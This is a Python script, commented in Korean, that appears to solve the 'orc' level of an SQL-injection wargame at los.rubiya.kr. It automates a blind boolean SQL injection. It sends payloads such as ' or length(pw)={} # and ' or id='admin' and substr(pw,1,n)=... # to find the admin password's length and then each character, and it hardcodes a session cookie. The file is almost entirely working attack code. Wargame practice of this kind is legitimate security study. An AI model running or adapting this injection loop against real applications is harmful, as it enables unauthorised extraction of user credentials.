# -*- coding: cp949 -*-
import urllib.request
from urllib.parse import quote
#basic url 선언
#query string 작성
#query string 사용 전 URL encoding
#request요청시 추가(User-Agent, Cookie)

#password를 담자 변수명
result = "" 
pwlen = 0
'''
    [0] URL정의
    [1] URL가공 : ' or length(pw) = {} #
    [2] HTTP객체에 URL Header 세팅(쿠키, 브라우저)
    [3] URL 웹서버에 요청
    [4] 응답에 "Hello admin" 포함확인
    [5] 포함된 URL의 인자 보관/출력
    '''
#파라미터 pw의 길이를 구하기 위한 반복문
for i in range(1,10):
    #url default로 정의(이후에 원하는 QUERY삽입을 위해 default설정)
    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
    #서브 쿼리 정의(pw 컬럼의 값을 구하는 쿼리)
    add_url = "' or length(pw)={} #".format(i)
    #URL encoding(원활한 get요청 호환성을 위해)
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)
    re.add_header("Cookie", "PHPSESSID=8al87atua9fclucfgn1vvuosb5")
    re.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
    response = urllib.request.urlopen(re)
    #print("1: {}, 2: {}".format(str(response.read()).find("Hello admin"), i))
    if str(response.read()).find("Hello admin") > 10:
        pwlen = i
        print("pw length : {}".format(pwlen))
        break
    '''
    [0] URL정의
    [1] URL가공 ' or substr(pw, X, 1) = X #
    [2] HTTP객체에 URL Header 세팅(쿠키, 브라우저)
    [3] URL 웹서버에 요청
    [4] 응답에 "Hello admin" 포함확인
    [5] 포함된 URL의 인자 보관/출력(소문자)
    '''
for i in range(1,pwlen+1):
    for j in range(ord('0'),ord('z')):
        #print(j)
        url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
        add_url = "' or id='admin' and substr(pw,1,{})='{}' #".format(str(i), result+chr(j))
        #print(add_url)
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)
        re.add_header("Cookie", "PHPSESSID=8al87atua9fclucfgn1vvuosb5")
        re.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
        res = urllib.request.urlopen(re)

        if str(res.read()).find("Hello admin")> 10:
            result += chr(j).lower()
            print(result)
            break

print("Password : " + result)
